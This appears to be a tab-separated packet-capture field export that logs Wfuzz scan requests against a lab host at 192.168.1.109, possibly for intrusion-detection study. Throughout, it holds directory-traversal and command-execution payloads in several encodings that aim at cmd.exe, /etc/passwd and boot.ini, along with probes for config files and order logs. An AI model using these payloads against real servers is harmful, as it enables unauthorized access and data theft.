http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									3584,3584,3584,3584,3584						1,1,1,1,1,1	http://192.168.1.109/web/GWWEB.EXE?HELP=bad-request/,http://192.168.1.109/web/Jigsaw//,http://192.168.1.109/web/OpenFile.aspx?file=../../../../../../../../../../boot.ini/,http://192.168.1.109/web/Proxy/LoginResponse/,http://192.168.1.109/web/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/Rpc/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/GWWEB.EXE?HELP=bad-request/,/web/Jigsaw//,/web/OpenFile.aspx?file=../../../../../../../../../../boot.ini/,/web/Proxy/LoginResponse/,/web/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\/,/web/Rpc/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4660,4660,4660,4660,4660,4660,4660						1,1,1,1,1,1,1,1	http://192.168.1.109/web/Rpc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/Site/biztalkhttpreceive.dll/,http://192.168.1.109/web/SiteServer/Admin/knowledge/dsmgr/default.asp/,http://192.168.1.109/web/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp/,http://192.168.1.109/web/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp/,http://192.168.1.109/web/WebAdmin.dll?View=Logon/,http://192.168.1.109/web/_layouts/settings.htm/,http://192.168.1.109/web/_mem_bin/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/Rpc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/Site/biztalkhttpreceive.dll/,/web/SiteServer/Admin/knowledge/dsmgr/default.asp/,/web/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp/,/web/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp/,/web/WebAdmin.dll?View=Logon/,/web/_layouts/settings.htm/,/web/_mem_bin/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4696,4696,4696,4696,4696,4696,4696,4696						1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/PBServer/check.bat/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/Rpc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/SilverStream/,http://192.168.1.109/web/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp/,http://192.168.1.109/web/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes/,http://192.168.1.109/web/WEB-INF//,http://192.168.1.109/web/WebShop/logs/ck.log/,http://192.168.1.109/web/_head.php/,http://192.168.1.109/web/_mem_bin/..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/PBServer/check.bat/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,/web/Rpc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,/web/SilverStream/,/web/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp/,/web/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes/,/web/WEB-INF//,/web/WebShop/logs/ck.log/,/web/_head.php/,/web/_mem_bin/..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4744,4744,4744,4744,4744,4744,4744						1,1,1,1,1,1,1,1	http://192.168.1.109/web/Rpc/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/SUNWmc/htdocs//,http://192.168.1.109/web/SiteServer/Admin/commerce/foundation/domain.asp/,http://192.168.1.109/web/Sites/Samples/Knowledge/Push/ViewCode.asp/,http://192.168.1.109/web/VBZooM/add-subject.php/,http://192.168.1.109/web/XMBforum/buddy.php/,http://192.168.1.109/web/_AuthChangeUrl?/,http://192.168.1.109/web/_mem_bin/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/Rpc/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,/web/SUNWmc/htdocs//,/web/SiteServer/Admin/commerce/foundation/domain.asp/,/web/Sites/Samples/Knowledge/Push/ViewCode.asp/,/web/VBZooM/add-subject.php/,/web/XMBforum/buddy.php/,/web/_AuthChangeUrl?/,/web/_mem_bin/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4792,4792,4792,4792,4792,4792,4792						1,1,1,1,1,1,1,1	http://192.168.1.109/web/SPHERA/login/sm_login_screen.php?uid=\/,http://192.168.1.109/web/SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator/,http://192.168.1.109/web/SiteServer/Publishing/ViewCode.asp/,http://192.168.1.109/web/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp/,http://192.168.1.109/web/WEBAGENT/CQMGSERV/CF-SINFO.TPF/,http://192.168.1.109/web/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html/,http://192.168.1.109/web/\../readme.txt/,http://192.168.1.109/web/_mem_bin/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/SPHERA/login/sm_login_screen.php?uid=\/,/web/SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator/,/web/SiteServer/Publishing/ViewCode.asp/,/web/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp/,/web/WEBAGENT/CQMGSERV/CF-SINFO.TPF/,/web/Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html/,/web/\../readme.txt/,/web/_mem_bin/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4809,4809,4809,4809,4809,4809,4809,4809						1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/Rpc/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/SPHERA/login/sm_login_screen.php?error=\/,http://192.168.1.109/web/SiteServer/Admin/knowledge/persmbr/vs.asp/,http://192.168.1.109/web/Survey/Survey.Htm/,http://192.168.1.109/web/WEB-INF./web.xml/,http://192.168.1.109/web/XMBforum/member.php/,http://192.168.1.109/web/[SecCheck]/..%2f../ext.ini/,http://192.168.1.109/web/\../config.sys/,http://192.168.1.109/web/_mem_bin/..%u0025%u005c../..%u0025%u005c../..%u0025%u005c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/Rpc/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,/web/SPHERA/login/sm_login_screen.php?error=\/,/web/SiteServer/Admin/knowledge/persmbr/vs.asp/,/web/Survey/Survey.Htm/,/web/WEB-INF./web.xml/,/web/XMBforum/member.php/,/web/[SecCheck]/..%2f../ext.ini/,/web/\../config.sys/,/web/_mem_bin/..%u0025%u005c../..%u0025%u005c../..%u0025%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/../../../../winnt/system32/cmd.exe?/c+dir%20c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/../../../../winnt/system32/cmd.exe?/c+dir%20c:\/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									4881						1,1	http://192.168.1.109/web/_mem_bin//,http://192.168.1.109/web/_mem_bin/../../../../winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin//,/web/_mem_bin/../../../../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4907,4907,4907,4907,4907,4907,4907,4907,4907,4907						1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00/,http://192.168.1.109/web/PBServer/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/SilverStream/Meta/Tables/?access-mode=text/,http://192.168.1.109/web/SiteServer/Admin/commerce/foundation/driver.asp/,http://192.168.1.109/web/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp/,http://192.168.1.109/web/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp/,http://192.168.1.109/web/WebShop/logs/cc.txt/,http://192.168.1.109/web/\../boot.ini/,http://192.168.1.109/web/XSQLConfig.xml/,http://192.168.1.109/web/_mem_bin/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00/,/web/PBServer/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,/web/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\/,/web/SilverStream/Meta/Tables/?access-mode=text/,/web/SiteServer/Admin/commerce/foundation/driver.asp/,/web/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp/,/web/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp/,/web/WebShop/logs/cc.txt/,/web/\../boot.ini/,/web/XSQLConfig.xml/,/web/_mem_bin/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									4984,4984,4984,4984,4984,4984,4984,4984,4984,4984						1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd/,http://192.168.1.109/web/PDG_Cart/order.log/,http://192.168.1.109/web/Rpc/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/SetSecurity.shm/,http://192.168.1.109/web/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp/,http://192.168.1.109/web/Sites/Knowledge/Membership/Inspired/ViewCode.asp/,http://192.168.1.109/web/TiVoConnect?Command=QueryServer/,http://192.168.1.109/web/WebSphereSamples/,http://192.168.1.109/web/_cti_pvt//,http://192.168.1.109/web/_layouts/userinfo.htm/,http://192.168.1.109/web/_mem_bin/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd/,/web/PDG_Cart/order.log/,/web/Rpc/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,/web/SetSecurity.shm/,/web/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp/,/web/Sites/Knowledge/Membership/Inspired/ViewCode.asp/,/web/TiVoConnect?Command=QueryServer/,/web/WebSphereSamples/,/web/_cti_pvt//,/web/_layouts/userinfo.htm/,/web/_mem_bin/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_mem_bin/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_mem_bin/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									5007						1,1	http://192.168.1.109/web/_mem_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_mem_bin/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/_mem_bin/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									5208,5208,5208,5208,5208,5208,5208,5208,5208						1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/PBServer/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/Search/,http://192.168.1.109/web/SiteServer/Admin/commerce/foundation/DSN.asp/,http://192.168.1.109/web/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp/,http://192.168.1.109/web/SiteServer/admin/findvserver.asp/,http://192.168.1.109/web/WS_FTP.LOG/,http://192.168.1.109/web/_layouts/alllibs.htm/,http://192.168.1.109/web/[SecCheck]/..%252f..%252f../ext.ini/,http://192.168.1.109/web/_mem_bin/auoconfig.asp/,http://192.168.1.109/web/_mem_bin/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/PBServer/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/Search/,/web/SiteServer/Admin/commerce/foundation/DSN.asp/,/web/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp/,/web/SiteServer/admin/findvserver.asp/,/web/WS_FTP.LOG/,/web/_layouts/alllibs.htm/,/web/[SecCheck]/..%252f..%252f../ext.ini/,/web/_mem_bin/auoconfig.asp/,/web/_mem_bin/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									5240,5240						1,1,1	http://192.168.1.109/web/_mem_bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_private/orders.htm/,http://192.168.1.109/web/_mem_bin/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/_private/orders.htm/,/web/_mem_bin/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/
